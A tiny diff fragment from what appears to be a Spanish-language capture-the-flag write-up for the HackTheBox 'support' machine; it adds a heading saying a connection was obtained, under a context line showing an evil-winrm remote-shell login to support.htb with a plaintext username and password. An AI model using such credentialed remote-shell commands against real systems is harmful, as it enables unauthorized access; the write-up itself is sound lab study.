@@ -134,3 +134,4 @@ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 ```
 
 ![[Pasted image 20240305003154.png]]
+###### perfecto tenemos conexío
